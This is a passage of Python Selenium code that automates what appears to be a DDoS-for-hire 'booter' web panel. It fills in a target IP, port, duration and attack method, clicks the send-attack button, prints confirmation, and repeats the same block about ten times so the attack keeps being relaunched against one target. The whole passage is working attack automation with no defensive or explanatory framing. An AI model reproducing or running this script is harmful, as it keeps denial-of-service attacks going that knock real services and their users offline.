dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
